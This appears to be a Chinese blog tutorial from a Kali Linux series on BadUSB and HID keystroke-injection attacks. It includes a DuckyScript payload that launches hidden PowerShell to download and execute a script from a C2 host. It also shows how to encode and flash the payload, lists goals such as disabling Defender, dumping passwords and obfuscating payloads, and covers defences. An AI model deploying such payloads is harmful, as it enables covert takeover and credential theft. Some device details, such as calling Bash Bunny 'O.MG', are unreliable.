---
title: 物理安全与硬件攻击：BadUSB 与 HID 渗透
slug: kali-4-物理安全badusb-0j7k8l
date: 2026-09-12
visibility: public
tags: [Kali Linux, 物理安全, BadUSB, HID攻击, 硬件攻击]
category: 渗透测试
---

# 物理安全与硬件攻击：BadUSB 与 HID 渗透

> 网络安全再强，**物理接近**依然是最致命的攻击路径。插个 U 盘就能拿下电脑，这不是电影，而是 **BadUSB / HID 攻击**的现实。本文从原理到制作，用 Kali 帮你理解这一类"降维打击"。

## 一、HID 攻击原理

HID（Human Interface Device，人机接口设备）—— 电脑把 U 盘当**键盘**，于是 U 盘可以"打字"：

```
USB 设备（伪装成键盘）
  ↓ 插入
操作系统识别为键盘（HID）
  ↓ 自动"打字"
执行命令（Win+R → powershell → 下载木马...）
```

> 关键在于：杀软不会拦截"键盘输入"，因为输入来自"合法键盘"。

## 二、BadUSB 的几种形式

| 设备 | 说明 |
|------|------|
| Rubber Ducky | 经典 BadUSB（DuckScript） |
| Flipper Zero | 多功能（HID+RFID+） |
| BadUSB 固件 | 任意 U 盘刷固件 |
| Bash Bunny | O.MG 系列 |

## 三、Rubber Ducky（橡皮鸭）实战

### 攻击脚本（DuckScript）

```
# 打开运行框
GUI r
# 延迟
DELAY 500
# 打开 PowerShell
STRING powershell -NoP -W Hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://c2/shell.ps1')"
ENTER
```

### 编码上板

```bash
# 把脚本编码成 bin（键盘布局映射）
java -jar duckencode.jar -i payload.txt -o inject.bin
# 烧录到 Rubber Ducky（插入即执行）
```

### 常见攻击场景

```
1. 弹出 PowerShell → 下载执行 C2 beacon
2. 修改注册表 → 持久化
3. 抓取 Wi-Fi 密码
4. 关闭 Windows Defender
5. 导出浏览器密码（mimikatz）
```

## 三、Flipper Zero / 其他硬件

- **Flipper Zero**：BadUSB + RFID 复制 + 子摇控
- **Bash Bunny**：更复杂，支持多阶段攻击
- **OMG Cable**：USB 线内嵌攻击芯片

## 四、防御物理攻击

```
1. 禁用自动播放（组策略/注册表）
2. 禁用 USB 存储（企业级：EDR/统一端点管理）
3. 键盘过滤驱动（限制自定义 HID）
4. 防钓鱼培训（不插陌生 U 盘）
5. 端点防护（EDR 检测 PowerShell 执行）
```

## 五、Kali 相关

| 工具/设备 | 用途 |
|------|------|
| Rubber Ducky | HID 注入 |
| DuckyScript | 脚本语言 |
| USB 制作工具 | 制作 BadUSB |
| WifiPhisher | 钓鱼（关联） |

## 六、测试与合规

> BadUSB 攻击用于**物理安全测试**（获授权），不属于线上攻击。未经授权插 U 盘、控制他人电脑属违法行为。测试时注意：只对授权设备/环境操作。

## 七、进阶方向

```
- 多阶段：USB + 网络钓鱼 + 权限提升
- 免杀：把 PS payload 做混淆
- 蓝牙攻击：手机/门锁（BT）
- 门禁卡：RFID 复制（需授权）
```

## 小结

- HID 攻击绕过所有软件防御，本质是"信任硬件"
- Rubber Ducky 是经典，Flipper 是新兴热点
- 防御核心：USB 管控 + 最小化攻击面
- 物理安全是网络安全的第一道也是最后一道防线
- 只在授权环境测试，红线不可越

> 至此，Kali Linux 渗透攻防体系 40 篇（基础10+进阶10+高级10+实战10）全部完成。从线上到线下、从软件到硬件，构建完整的攻防知识地图。